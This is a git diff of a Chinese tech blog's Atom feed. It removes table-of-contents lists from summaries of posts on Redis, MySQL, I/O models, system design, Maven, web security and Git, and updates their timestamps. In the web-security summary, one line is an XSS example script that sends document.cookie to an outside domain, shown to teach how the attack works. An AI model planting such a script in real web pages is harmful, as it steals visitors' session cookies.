-&lt;li&gt;&lt;a href=&quot;#数据类型&quot;&gt;数据类型&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#数据持久化&quot;&gt;数据持久化&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分布式&quot;&gt;分布式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#内存管理机制&quot;&gt;内存管理机制&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六键的过期时间&quot;&gt;六、键的过期时间&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七数据淘汰策略&quot;&gt;七、数据淘汰策略&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八持久化&quot;&gt;八、持久化&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#rdb-持久化&quot;&gt;RDB 持久化&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#aof-持久化&quot;&gt;AOF 持久化&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九事务&quot;&gt;九、事务&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十事件&quot;&gt;十、事件&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#文件事件&quot;&gt;文件事件&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#时间事件&quot;&gt;时间事件&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#事件的调度与执行&quot;&gt;事件的调度与执行&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十一复制&quot;&gt;十一、复制&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#连接过程&quot;&gt;连接过程&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#主从链&quot;&gt;主从链&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十二sentinel&quot;&gt;十二、Sentinel&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十三分片&quot;&gt;十三、分片&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十四一个简单的论坛系统分析&quot;&gt;十四、一个简单的论坛系统分析&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#文章信息&quot;&gt;文章信息&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#点赞功能&quot;&gt;点赞功能&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#对文章进行排序&quot;&gt;对文章进行排序&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。&lt;/p&gt;&lt;p&gt;键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。&lt;/p&gt;&lt;p&gt;Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。&lt;/p&gt;&lt;h1 id=&quot;二、数据类型&quot;&gt;&lt;a href=&quot;#二、数据类型&quot; class=&quot;headerlink&quot; title=&quot;二、数据类型&quot;&gt;&lt;/a&gt;二、数据类型&lt;/h1&gt;
     
     </summary>
     
@@ -668,55 +252,11 @@
     <link href="https://sometwo7.github.io/blog/post/7a97d7b6.html"/>
     <id>https://sometwo7.github.io/blog/post/7a97d7b6.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一索引&quot;&gt;一、索引&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#b-tree-原理&quot;&gt;B+ Tree 原理&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#mysql-索引&quot;&gt;MySQL 索引&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#索引优化&quot;&gt;索引优化&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#索引的优点&quot;&gt;索引的优点&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#索引的使用条件&quot;&gt;索引的使用条件&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二查询性能优化&quot;&gt;二、查询性能优化&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#使用-explain-进行分析&quot;&gt;使用 Explain 进行分析&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#优化数据访问&quot;&gt;优化数据访问&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#重构查询方式&quot;&gt;重构查询方式&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三存储引擎&quot;&gt;三、存储引擎&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#innodb&quot;&gt;InnoDB&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#myisam&quot;&gt;MyISAM&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#比较&quot;&gt;比较&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四数据类型&quot;&gt;四、数据类型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#整型&quot;&gt;整型&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#浮点数&quot;&gt;浮点数&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#字符串&quot;&gt;字符串&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#时间和日期&quot;&gt;时间和日期&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五切分&quot;&gt;五、切分&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#水平切分&quot;&gt;水平切分&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#垂直切分&quot;&gt;垂直切分&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#sharding-策略&quot;&gt;Sharding 策略&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#sharding-存在的问题&quot;&gt;Sharding 存在的问题&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六复制&quot;&gt;六、复制&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#主从复制&quot;&gt;主从复制&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#读写分离&quot;&gt;读写分离&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一、索引&quot;&gt;&lt;a href=&quot;#一、索引&quot; class=&quot;headerlink&quot; title=&quot;一、索引&quot;&gt;&lt;/a&gt;一、索引&lt;/h1&gt;&lt;h2 id=&quot;B-Tree-原理&quot;&gt;&lt;a href=&quot;#B-Tree-原理&quot; class=&quot;headerlink&quot; title=&quot;B+ Tree 原理&quot;&gt;&lt;/a&gt;B+ Tree 原理&lt;/h2&gt;&lt;h3 id=&quot;1-数据结构&quot;&gt;&lt;a href=&quot;#1-数据结构&quot; class=&quot;headerlink&quot; title=&quot;1. 数据结构&quot;&gt;&lt;/a&gt;1. 数据结构&lt;/h3&gt;&lt;p&gt;B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。&lt;/p&gt;&lt;p&gt;B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。&lt;/p&gt;&lt;p&gt;在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key&lt;sub&gt;i&lt;/sub&gt; 和 key&lt;sub&gt;i+1&lt;/sub&gt;，且不为 null，则该指针指向节点的所有 key 大于等于 key&lt;sub&gt;i&lt;/sub&gt; 且小于等于 key&lt;sub&gt;i+1&lt;/sub&gt;。&lt;/p&gt;
     
     </summary>
     
@@ -733,36 +273,19 @@
     <link href="https://sometwo7.github.io/blog/post/ecffdd03.html"/>
     <id>https://sometwo7.github.io/blog/post/ecffdd03.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一io-模型&quot;&gt;一、I/O 模型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#阻塞式-io&quot;&gt;阻塞式 I/O&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#非阻塞式-io&quot;&gt;非阻塞式 I/O&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#io-复用&quot;&gt;I/O 复用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#信号驱动-io&quot;&gt;信号驱动 I/O&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#异步-io&quot;&gt;异步 I/O&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五大-io-模型比较&quot;&gt;五大 I/O 模型比较&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二io-复用&quot;&gt;二、I/O 复用&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#select&quot;&gt;select&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#poll&quot;&gt;poll&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#比较&quot;&gt;比较&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#epoll&quot;&gt;epoll&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#工作模式&quot;&gt;工作模式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#应用场景&quot;&gt;应用场景&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
+      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
 &lt;li&gt;等待数据准备好&lt;/li&gt;
 &lt;li&gt;从内核向进程复制数据&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
+&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
+&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
 &lt;/ul&gt;
     
     </summary>
@@ -776,25 +299,42 @@
   </entry>
   
   <entry>
+    <title>网络技术 - 面向对象思想</title>
+    <link href="https://sometwo7.github.io/blog/post/7a9a193e.html"/>
+    <id>https://sometwo7.github.io/blog/post/7a9a193e.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2019-11-12T06:21:18.316Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、三大特性&quot;&gt;&lt;a href=&quot;#一、三大特性&quot; class=&quot;headerlink&quot; title=&quot;一、三大特性&quot;&gt;&lt;/a&gt;一、三大特性&lt;/h1&gt;&lt;h2 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h2&gt;&lt;p&gt;利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。&lt;/p&gt;&lt;p&gt;优点：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;减少耦合：可以独立地开发、测试、优化、使用、理解和修改&lt;/li&gt;
+&lt;li&gt;减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块&lt;/li&gt;
+&lt;li&gt;有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能&lt;/li&gt;
+&lt;li&gt;提高软件的可重用性&lt;/li&gt;
+&lt;li&gt;降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="对象" scheme="https://sometwo7.github.io/blog/tags/%E5%AF%B9%E8%B1%A1/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - 系统设计基础</title>
     <link href="https://sometwo7.github.io/blog/post/bf574124.html"/>
     <id>https://sometwo7.github.io/blog/post/bf574124.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一性能&quot;&gt;一、性能&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二伸缩性&quot;&gt;二、伸缩性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三扩展性&quot;&gt;三、扩展性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四可用性&quot;&gt;四、可用性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五安全性&quot;&gt;五、安全性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、性能&quot;&gt;&lt;a href=&quot;#一、性能&quot; class=&quot;headerlink&quot; title=&quot;一、性能&quot;&gt;&lt;/a&gt;一、性能&lt;/h1&gt;&lt;h2 id=&quot;性能指标&quot;&gt;&lt;a href=&quot;#性能指标&quot; class=&quot;headerlink&quot; title=&quot;性能指标&quot;&gt;&lt;/a&gt;性能指标&lt;/h2&gt;&lt;h3 id=&quot;1-响应时间&quot;&gt;&lt;a href=&quot;#1-响应时间&quot; class=&quot;headerlink&quot; title=&quot;1. 响应时间&quot;&gt;&lt;/a&gt;1. 响应时间&lt;/h3&gt;&lt;p&gt;指某个请求从发出到接收到响应消耗的时间。&lt;/p&gt;&lt;p&gt;在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。&lt;/p&gt;&lt;h3 id=&quot;2-吞吐量&quot;&gt;&lt;a href=&quot;#2-吞吐量&quot; class=&quot;headerlink&quot; title=&quot;2. 吞吐量&quot;&gt;&lt;/a&gt;2. 吞吐量&lt;/h3&gt;&lt;p&gt;指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。&lt;/p&gt;&lt;h3 id=&quot;3-并发用户数&quot;&gt;&lt;a href=&quot;#3-并发用户数&quot; class=&quot;headerlink&quot; title=&quot;3. 并发用户数&quot;&gt;&lt;/a&gt;3. 并发用户数&lt;/h3&gt;
+      &lt;h1 id=&quot;一、性能&quot;&gt;&lt;a href=&quot;#一、性能&quot; class=&quot;headerlink&quot; title=&quot;一、性能&quot;&gt;&lt;/a&gt;一、性能&lt;/h1&gt;&lt;h2 id=&quot;性能指标&quot;&gt;&lt;a href=&quot;#性能指标&quot; class=&quot;headerlink&quot; title=&quot;性能指标&quot;&gt;&lt;/a&gt;性能指标&lt;/h2&gt;&lt;h3 id=&quot;1-响应时间&quot;&gt;&lt;a href=&quot;#1-响应时间&quot; class=&quot;headerlink&quot; title=&quot;1. 响应时间&quot;&gt;&lt;/a&gt;1. 响应时间&lt;/h3&gt;&lt;p&gt;指某个请求从发出到接收到响应消耗的时间。&lt;/p&gt;&lt;p&gt;在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。&lt;/p&gt;&lt;h3 id=&quot;2-吞吐量&quot;&gt;&lt;a href=&quot;#2-吞吐量&quot; class=&quot;headerlink&quot; title=&quot;2. 吞吐量&quot;&gt;&lt;/a&gt;2. 吞吐量&lt;/h3&gt;&lt;p&gt;指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。&lt;/p&gt;&lt;h3 id=&quot;3-并发用户数&quot;&gt;&lt;a href=&quot;#3-并发用户数&quot; class=&quot;headerlink&quot; title=&quot;3. 并发用户数&quot;&gt;&lt;/a&gt;3. 并发用户数&lt;/h3&gt;&lt;p&gt;指系统能同时处理的并发用户请求数量。&lt;/p&gt;&lt;p&gt;在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。&lt;/p&gt;
     
     </summary>
     
@@ -811,19 +351,11 @@
     <link href="https://sometwo7.github.io/blog/post/4ad173cd.html"/>
     <id>https://sometwo7.github.io/blog/post/4ad173cd.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一构建工具的作用&quot;&gt;一、构建工具的作用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二java-主流构建工具&quot;&gt;二、Java 主流构建工具&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三maven&quot;&gt;三、Maven&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、构建工具的作用&quot;&gt;&lt;a href=&quot;#一、构建工具的作用&quot; class=&quot;headerlink&quot; title=&quot;一、构建工具的作用&quot;&gt;&lt;/a&gt;一、构建工具的作用&lt;/h1&gt;&lt;p&gt;构建工具是用于构建项目的自动化工具，主要包含以下工作：&lt;/p&gt;&lt;h2 id=&quot;依赖管理&quot;&gt;&lt;a href=&quot;#依赖管理&quot; class=&quot;headerlink&quot; title=&quot;依赖管理&quot;&gt;&lt;/a&gt;依赖管理&lt;/h2&gt;&lt;p&gt;不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。&lt;/p&gt;&lt;h2 id=&quot;运行单元测试&quot;&gt;&lt;a href=&quot;#运行单元测试&quot; class=&quot;headerlink&quot; title=&quot;运行单元测试&quot;&gt;&lt;/a&gt;运行单元测试&lt;/h2&gt;
+      &lt;h1 id=&quot;一、构建工具的作用&quot;&gt;&lt;a href=&quot;#一、构建工具的作用&quot; class=&quot;headerlink&quot; title=&quot;一、构建工具的作用&quot;&gt;&lt;/a&gt;一、构建工具的作用&lt;/h1&gt;&lt;p&gt;构建工具是用于构建项目的自动化工具，主要包含以下工作：&lt;/p&gt;&lt;h2 id=&quot;依赖管理&quot;&gt;&lt;a href=&quot;#依赖管理&quot; class=&quot;headerlink&quot; title=&quot;依赖管理&quot;&gt;&lt;/a&gt;依赖管理&lt;/h2&gt;&lt;p&gt;不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。&lt;/p&gt;&lt;h2 id=&quot;运行单元测试&quot;&gt;&lt;a href=&quot;#运行单元测试&quot; class=&quot;headerlink&quot; title=&quot;运行单元测试&quot;&gt;&lt;/a&gt;运行单元测试&lt;/h2&gt;&lt;p&gt;不再需要在项目代码中添加测试代码，从而避免了污染项目代码。&lt;/p&gt;&lt;h2 id=&quot;将源代码转化为可执行文件&quot;&gt;&lt;a href=&quot;#将源代码转化为可执行文件&quot; class=&quot;headerlink&quot; title=&quot;将源代码转化为可执行文件&quot;&gt;&lt;/a&gt;将源代码转化为可执行文件&lt;/h2&gt;
     
     </summary>
     
@@ -840,20 +372,11 @@
     <link href="https://sometwo7.github.io/blog/post/877061f8.html"/>
     <id>https://sometwo7.github.io/blog/post/877061f8.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一跨站脚本攻击&quot;&gt;一、跨站脚本攻击&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二跨站请求伪造&quot;&gt;二、跨站请求伪造&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三sql-注入攻击&quot;&gt;三、SQL 注入攻击&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四拒绝服务攻击&quot;&gt;四、拒绝服务攻击&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;
+      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
@@ -870,27 +393,11 @@
     <link href="https://sometwo7.github.io/blog/post/685bfdc8.html"/>
     <id>https://sometwo7.github.io/blog/post/685bfdc8.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#集中式与分布式&quot;&gt;集中式与分布式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#中心服务器&quot;&gt;中心服务器&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#工作流&quot;&gt;工作流&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分支实现&quot;&gt;分支实现&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#冲突&quot;&gt;冲突&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#fast-forward&quot;&gt;Fast forward&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分支管理策略&quot;&gt;分支管理策略&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#储藏stashing&quot;&gt;储藏（Stashing）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#ssh-传输设置&quot;&gt;SSH 传输设置&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#gitignore-文件&quot;&gt;.gitignore 文件&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#git-命令一览&quot;&gt;Git 命令一览&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;
